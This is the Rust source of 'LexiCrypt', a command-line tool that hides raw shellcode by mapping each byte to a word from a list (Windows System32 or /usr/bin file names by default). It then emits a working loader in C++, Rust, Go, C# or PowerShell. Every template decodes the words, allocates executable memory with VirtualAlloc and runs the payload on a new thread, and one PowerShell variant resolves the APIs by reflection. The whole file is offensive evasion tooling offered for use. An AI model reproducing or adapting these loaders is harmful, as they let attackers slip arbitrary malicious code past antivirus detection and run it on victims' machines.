use std::path::{Path, PathBuf};
use std::fs;
use std::collections::HashSet;
use std::io::{BufRead, BufReader};
use rand::seq::SliceRandom;
use rand::Rng;
use clap::{Arg, Command, ArgAction};

#[derive(Debug)]
struct Args {
    input_file: PathBuf,
    output_file: PathBuf,
    template_name: String,
    wordlist_path: Option<PathBuf>,
    random: bool,
}

fn parse_args() -> Args {
    let matches = Command::new("LexiCrypt")
        .arg(
            Arg::new("input")
                .short('i')
                .long("input")
                .value_name("INPUT_FILE")
                .help("Path to the input shellcode file")
                .num_args(1)
                .required(true),
        )
        .arg(
            Arg::new("output")
                .short('o')
                .long("output")
                .value_name("OUTPUT_FILE")
                .help("Path to the output file")
                .num_args(1)
                .required(true),
        )
        .arg(
            Arg::new("template")
                .short('t')
                .long("template")
                .value_name("TEMPLATE")
                .help("The output template format (e.g., cpp, rust, csharp, go, wsh (VBScript))")
                .num_args(1)
                .required(true)
        )
        .arg(
            Arg::new("wordlist")
                .short('w')
                .long("wordlist")
                .value_name("WORDLIST_DIR")
                .help("Path to the directory containing the wordlist (default: /usr/bin/ on Linux, C:\\Windows\\System32 on Windows)")
                .num_args(1)
                .required(false)
        )
        .arg(
            Arg::new("random")
                .short('r')
                .help("Use a randomly generated wordlist")
                .long("random")
                .action(ArgAction::SetTrue)
                .required(false)
                .num_args(0)
        )
        .get_matches();
    Args {
        input_file: PathBuf::from(matches.get_one::<String>("input").unwrap()),
        output_file: PathBuf::from(matches.get_one::<String>("output").unwrap()),
        template_name: matches.get_one::<String>("template").unwrap().to_string(),
        wordlist_path: matches.get_one::<String>("wordlist").map(PathBuf::from),
        random: matches.get_flag("random")
    }
}

fn generate_random_word(length: usize) -> String {
    let mut rng = rand::thread_rng();
    (0..length)
        .map(|_| rng.gen_range(b'a'..=b'z') as char) // Generate random ASCII letters
        .collect()
}

fn get_words(dir_path: &Path) -> std::io::Result<Vec<String>> {
    
    let mut unique_names: HashSet<String> = HashSet::new();
    
    for entry in fs::read_dir(dir_path)? {
        let entry = entry?;
        if entry.file_type()?.is_file() {
            if let Some(name) = entry.path().file_stem() {
                if let Some(name_str) = name.to_str() {
                    unique_names.insert(name_str.to_string());
                }
            }
        }
    }

    let mut names: Vec<_> = unique_names.into_iter().collect();
    println!("Found {} unique words", names.len());
    
    names.shuffle(&mut rand::thread_rng());
    names.truncate(256);
    
    println!("First 5 words in list:");
    for (i, word) in names.iter().take(5).enumerate() {
        println!("Word[{}] = {}", i, word);
    }

    Ok(names)
}

fn get_words_from_file(file_path: &Path) -> std::io::Result<Vec<String>> {
    let file = fs::File::open(file_path)?;
    let reader = BufReader::new(file);
    let mut unique_words: HashSet<String> = HashSet::new();

    for line in reader.lines() {
        if let Ok(word) = line {
            unique_words.insert(word);
        }
    }

    let mut words: Vec<_> = unique_words.into_iter().collect();
    println!("Found {} unique words", words.len());

    words.shuffle(&mut rand::thread_rng());
    words.truncate(256);

    println!("First 5 words in list:");
    for (i, word) in words.iter().take(5).enumerate() {
        println!("Word[{}] = {}", i, word);
    }
    Ok(words)
}

fn encode_shellcode(shellcode: &[u8], word_list: &[String]) -> Vec<String> {
    println!("\nFirst 10 bytes of shellcode:");
    for (i, &byte) in shellcode.iter().take(10).enumerate() {
        println!("Byte[{}] = 0x{:02x} -> {}", i, byte, word_list[byte as usize]);
    }

    shellcode.iter()
        .map(|&byte| word_list[byte as usize].clone())
        .collect()
}

fn verify_encoding(original: &[u8], encoded: &[String], word_list: &[String]) {
    println!("\nVerifying encoding/decoding:");
    
    let mut word_positions = std::collections::HashMap::new();
    for (i, word) in word_list.iter().enumerate() {
        word_positions.insert(word, i);
    }
    
    for i in 0..std::cmp::min(10, original.len()) {
        let original_byte = original[i];
        let encoded_word = &encoded[i];
        let decoded_byte = *word_positions.get(encoded_word).unwrap() as u8;
        println!("Position {}: 0x{:02x} -> {} -> 0x{:02x}", 
                i, original_byte, encoded_word, decoded_byte);
        assert_eq!(original_byte, decoded_byte, "Mismatch at position {}", i);
    }
}

fn chunk_shellcode(payload: &[String], _cap: usize) -> Vec<String> {
    let chunk_size = 25; // Smaller chunks to avoid compiler issues
    let mut chunks = Vec::new();
    let mut current_chunk = Vec::with_capacity(chunk_size);
    let mut current_line;
    
    for item in payload.iter() {
        // Add item to current chunk
        current_chunk.push(format!("\"{}\"", item));
        
        // If chunk is full, join it and add to chunks vector
        if current_chunk.len() >= chunk_size {
            current_line = current_chunk.join(", ");
            chunks.push(current_line);
            current_chunk.clear();
        }
    }
    
    // Handle any remaining items
    if !current_chunk.is_empty() {
        current_line = current_chunk.join(", ");
        chunks.push(current_line);
    }
    
    chunks
}

fn generate_output(encoded: &[String], word_list: &[String], template: &str) -> String {
    let (chunked, encoded_str) = if template == "cpp" {
        let chunked = chunk_shellcode(&encoded, 25); // Adjust chunk size as needed
        let encoded_chunks: Vec<String> = chunked
            .iter()
            .enumerate()
            .map(|(i, chunk)| format!("std::vector<std::string> encodedWordsPart{} = {{{}}};", i, chunk.as_str()))
            .collect();
        let encoded_merge_code = (0..chunked.len())
            .map(|i| format!("encodedWords.insert(encodedWords.end(), encodedWordsPart{}.begin(), encodedWordsPart{}.end());", i, i))
            .collect::<Vec<_>>()
            .join("\n    ");
        (encoded_chunks, encoded_merge_code)
    } else {
        // Non-C++ logic stays the same
        (Vec::new(), encoded.iter()
            .map(|s| format!("\"{}\"", s))
            .collect::<Vec<_>>()
            .join(", "))
    };

    let wordlist_str = word_list.iter()
        .map(|s| format!("\"{}\"", s))
        .collect::<Vec<_>>()
        .join(", ");

    match template {
        // this was so hard to figure out for compilation....
        "cpp" => format!(r#"
#include <vector>
#include <string>
#include <windows.h>
#include <stdio.h>

typedef unsigned char BYTE;

// Encoded words split into smaller chunks
{chunked}

std::vector<std::string> encodedWords;
std::vector<std::string> wordList = {{{wordlist_str}}};

std::vector<BYTE> Decode(const std::vector<std::string>& encoded) {{
    std::vector<BYTE> shellcode;
    printf("[+] Decoding %zu bytes\n", encoded.size());

    for (const auto& word : encoded) {{
        for (size_t i = 0; i < wordList.size(); i++) {{
            if (wordList[i] == word) {{
                shellcode.push_back((BYTE)i);
                if (shellcode.size() <= 5) {{
                    printf("[+] Decoded byte %zu: 0x%02x\n", shellcode.size() - 1, (BYTE)i);
                }}
                break;
            }}
        }}
    }}
    return shellcode;
}}

int main() {{
    printf("[+] Starting decoder\n");

    // Merge chunks
    {encoded_str}

    auto shellcode = Decode(encodedWords);

    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory at %p\n", exec);

    RtlMoveMemory(exec, shellcode.data(), shellcode.size());
    printf("[+] Copied shellcode\n");

    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    printf("[+] Created thread\n");

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}}
"#,
        chunked = chunked.join("\n"),
        encoded_str = encoded_str,
        wordlist_str = wordlist_str
    ),
        
        "rust" => format!(
    r#"
use std::ptr;
use std::mem;
use std::io::BufReader;

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut u8;
    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize, lpStartAddress: *mut u8, lpParameter: *mut u8, dwCreationFlags: u32, lpThreadId: *mut u32) -> isize;
    fn WaitForSingleObject(hHandle: isize, dwMilliseconds: u32) -> u32;
}}

fn decode(encoded_words: &[&str], word_list: &[&str]) -> Vec<u8> {{
    println!("[+] Decoding shellcode...");
    let mut shellcode = Vec::new();

    for word in encoded_words {{
        for (i, w) in word_list.iter().enumerate() {{
            if w == word {{
                shellcode.push(i as u8);
                break;
            }}
        }}
    }}

    shellcode
}}

fn main() {{
    let encoded_words = &[{}];
    let word_list = &[{}];

    let shellcode = decode(encoded_words, word_list);
    println!("[+] Decoded {{}} bytes", shellcode.len());

    unsafe {{
        let addr = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            0x1000 | 0x2000,  // MEM_COMMIT | MEM_RESERVE
            0x40,             // PAGE_EXECUTE_READWRITE
        );

        if addr.is_null() {{
            panic!("VirtualAlloc failed");
        }}
        println!("[+] Memory allocated");

        ptr::copy(shellcode.as_ptr(), addr, shellcode.len());
        println!("[+] Shellcode copied");

        let thread = CreateThread(
            ptr::null_mut(),
            0,
            addr,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if thread == 0 {{
            panic!("CreateThread failed");
        }}
        println!("[+] Thread created");

        WaitForSingleObject(thread, 0xFFFFFFFF);
    }}
}}"#,
    encoded_str, 
    wordlist_str
        ),

        "go" => format!(
            "package main\n\nimport (\n\t\"fmt\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nvar (\n\tkernel32      = syscall.NewLazyDLL(\"kernel32.dll\")\n\tvirtualAlloc  = kernel32.NewProc(\"VirtualAlloc\")\n\tcreateThread  = kernel32.NewProc(\"CreateThread\")\n\twaitForObject = kernel32.NewProc(\"WaitForSingleObject\")\n)\n\nfunc Decode(encodedWords []string, wordList []string) []byte {{\n\tshellcode := make([]byte, 0)\n\tfmt.Println(\"[+] Decoding shellcode...\")\n\n\tfor _, word := range encodedWords {{\n\t\tfor i, w := range wordList {{\n\t\t\tif w == word {{\n\t\t\t\tshellcode = append(shellcode, byte(i))\n\t\t\t\tbreak\n\t\t\t}}\n\t\t}}\n\t}}\n\n\treturn shellcode\n}}\n\nfunc main() {{\n\tencodedWords := []string{{{}}};\n\twordList := []string{{{}}};\n\n\tshellcode := Decode(encodedWords, wordList)\n\tfmt.Printf(\"[+] Decoded %d bytes\\n\", len(shellcode))\n\n\taddr, _, err := virtualAlloc.Call(\n\t\t0,\n\t\tuintptr(len(shellcode)),\n\t\t0x1000|0x2000,\n\t\t0x40,\n\t)\n\tif addr == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Memory allocated\")\n\n\t// Copy shellcode to allocated memory\n\tfor i := 0; i < len(shellcode); i++ {{\n\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]\n\t}}\n\tfmt.Println(\"[+] Shellcode copied\")\n\n\thandle, _, err := createThread.Call(\n\t\t0,\n\t\t0,\n\t\taddr,\n\t\tuintptr(0),\n\t\t0,\n\t\t0,\n\t)\n\tif handle == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Thread created\")\n\n\twaitForObject.Call(handle, 0xFFFFFFFF)\n}}",
            encoded_str,
            wordlist_str
        ),

        "csharp" => format!(
            "using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\n\nclass Program {{\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint size);\n\n    const uint MEM_COMMIT = 0x1000;\n    const uint MEM_RESERVE = 0x2000;\n    const uint PAGE_EXECUTE_READWRITE = 0x40;\n\n    static byte[] Decode(string[] encodedWords, string[] wordList) {{\n        var shellcode = new List<byte>();\n        Console.WriteLine(\"[+] Decoding shellcode...\");\n\n        foreach (var word in encodedWords) {{\n            var index = Array.IndexOf(wordList, word);\n            if (index != -1) {{\n                shellcode.Add((byte)index);\n            }}\n        }}\n\n        return shellcode.ToArray();\n    }}\n\n    static void Main() {{\n        string[] encodedWords = new string[] {{ {} }};\n        string[] wordList = new string[] {{ {} }};\n\n        byte[] shellcode = Decode(encodedWords, wordList);\n        Console.WriteLine($\"[+] Decoded {{shellcode.Length}} bytes\");\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        Console.WriteLine(\"[+] Memory allocated\");\n\n        RtlMoveMemory(addr, shellcode, (uint)shellcode.Length);\n        Console.WriteLine(\"[+] Shellcode copied\");\n\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        Console.WriteLine(\"[+] Thread created\");\n\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n    }}\n}}",
            encoded_str,
            wordlist_str
        ),
    
        "powershell" => format!(
            r#"
            $VrtAlloc = @"
            using System;
            using System.Runtime.InteropServices;

            public class VrtAlloc {{
                [DllImport("kernel32")]
                public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
            }}
"@

            Add-Type $VrtAlloc 

            $WaitFor= @"
            using System;
            using System.Runtime.InteropServices;

            public class WaitFor{{
            [DllImport("kernel32.dll", SetLastError=true)]
                public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
        }}
"@

            Add-Type $WaitFor

            $CrtThread= @"
            using System;
            using System.Runtime.InteropServices;

            public class CrtThread{{
            [DllImport("kernel32", CharSet=CharSet.Ansi)]
                public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            
            }}
"@
            Add-Type $CrtThread   

            $encoded = @({})
            $word_list = @({})

            [Byte[]] $buf = @()

            foreach ($word in $encoded) {{
                for ($i = 0; $i -lt $word_list.Count; $i++) {{
                    if ($word_list[$i] -eq $word) {{
                        $buf += [byte]$i
                        break
                    }}
                }}
            }}
            [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
            [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
            $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
            [WaitFor]::WaitForSingleObject($thandle, [uint32]'0xFFFFFFFF')
            "#,
            encoded_str,
            wordlist_str
        ),

        "powershell_alt" => format!(
            r#"
$EncodedWords = @({})
$WordList = @({})

function Decode-Shellcode {{
    Write-Host "[+] Decoding shellcode..."
    $Shellcode = New-Object byte[] $EncodedWords.Count
    
    for($i = 0; $i -lt $EncodedWords.Count; $i++) {{
        $word = $EncodedWords[$i]
        for($j = 0; $j -lt $WordList.Count; $j++) {{
            if($WordList[$j] -eq $word) {{
                $Shellcode[$i] = [byte]$j
                break
            }}
        }}
    }}
    
    return $Shellcode
}}

function Invoke-Shellcode {{
    $Shellcode = Decode-Shellcode
    Write-Host "[+] Decoded $($Shellcode.Length) bytes"

    # Define required functions
    $Kernel32 = {{
        VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll VirtualAlloc),
            (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
        )
        CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll CreateThread),
            (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
        )
        WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll WaitForSingleObject),
            (Get-DelegateType @([IntPtr], [UInt32]) ([UInt32]))
        )
    }}

    # Allocate memory
    $Memory = $Kernel32.VirtualAlloc.Invoke(
        [IntPtr]::Zero,
        $Shellcode.Length,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x40    # PAGE_EXECUTE_READWRITE
    )

    if($Memory -eq [IntPtr]::Zero) {{
        throw "Failed to allocate memory"
    }}
    Write-Host "[+] Memory allocated at 0x$($Memory.ToString('X8'))"

    # Copy shellcode
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Memory, $Shellcode.Length)
    Write-Host "[+] Shellcode copied to memory"

    # Create thread
    $Thread = $Kernel32.CreateThread.Invoke(
        [IntPtr]::Zero,
        0,
        $Memory,
        [IntPtr]::Zero,
        0,
        [IntPtr]::Zero
    )

    if($Thread -eq [IntPtr]::Zero) {{
        throw "Failed to create thread"
    }}
    Write-Host "[+] Thread created"

    # Wait for completion
    $Kernel32.WaitForSingleObject.Invoke($Thread, 0xFFFFFFFF)
    Write-Host "[+] Execution completed"
}}

# Helper functions for PowerShell API access
function Get-ProcAddress {{
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }}
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([Runtime.InteropServices.HandleRef], [String]))
    $Kern32Handle = [System.Runtime.InteropServices.HandleRef]::new((New-Object IntPtr), ($UnsafeNativeMethods.GetMethod('GetModuleHandle')).Invoke($null, @($Module)))
    $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$Kern32Handle, $Procedure))
}}

function Get-DelegateType {{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters,
        [Parameter(Position = 1)] [Type] $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    $TypeBuilder.CreateType()
}}

# Execute the shellcode
try {{
    Invoke-Shellcode
}} catch {{
    Write-Host "[-] Error: $_" -ForegroundColor Red
}}
            "#,
            encoded_str,
            wordlist_str
        ),
        _ => panic!("Unsupported template")
    }
}



fn main() -> Result<(), Box<dyn std::error::Error>> {
    if std::env::args().len() == 1 {
        // hardcoded this because I'm not sure how to do it with clap. 
        println!(r#"
Usage: LexiCrypt.exe [OPTIONS] --input <INPUT_FILE> --output <OUTPUT_FILE> --template <TEMPLATE>

Options:
  -i, --input <INPUT_FILE>       Path to the input shellcode file
  -o, --output <OUTPUT_FILE>     Path to the output file
  -t, --template <TEMPLATE>      The output template format (e.g., cpp, rust, csharp, go, wsh (VBScript))
  -w, --wordlist <WORDLIST_DIR>  Path to the directory containing the wordlist (default: /usr/bin/ on Linux, C:\Windows\System32 on Windows)
  -r, --random                   Use a randomly generated wordlist
  -h, --help                     Print help")
"#);
        return Ok(());
    }

    let args = parse_args();
    if args.random && args.wordlist_path.is_some() {
        return Err("Cannot use both --random and --wordlist".into());
    }

    let random_flag = args.random;

    let wordlist = if random_flag {
        println!("Using randomly generated wordlist");
        (0..256).map(|_| generate_random_word(4)).collect()
    } else if let Some(wordlist_path) = &args.wordlist_path {
        println!("Using custom wordlist directory: {:?}", wordlist_path);
        get_words_from_file(wordlist_path)?
    } else if cfg!(target_os = "linux") {
        println!("Using /usr/bin/ as wordlist directory");
        get_words(Path::new("/usr/bin/"))?
    } else {
        println!("Using C:\\Windows\\System32 as wordlist directory");
        get_words(Path::new("C:\\Windows\\System32"))?
    };

    if wordlist.len() != 256 {
        return Err("Failed to get exactly 256 words".into());
    }

    println!("\nReading shellcode...");
    let shellcode = fs::read(&args.input_file)?;
    println!("Read {} bytes", shellcode.len());

    println!("\nEncoding shellcode...");
    let encoded = encode_shellcode(&shellcode, &wordlist);
    
    println!("\nVerifying encoding...");
    verify_encoding(&shellcode, &encoded, &wordlist);

    println!("\nGenerating output...");
    let output = generate_output(&encoded, &wordlist, &args.template_name);

    println!("\nWriting output...");
    fs::write(&args.output_file, output)?;

    if args.template_name == "wsh" {
        println!("\n{}", "*".repeat(80));
        println!("I did not test the generated code for VBS. It may not work.");
        println!("{}\n", "*".repeat(80));
    }

    if args.template_name == "cpp"{
        println!("Compilie using the following command:\n");
        println!("cl .\\output.cpp /EHsc /Od /bigobj\n");
        println!("If you don't, it may fail.")
    }

    println!("Done!");
    Ok(())
}
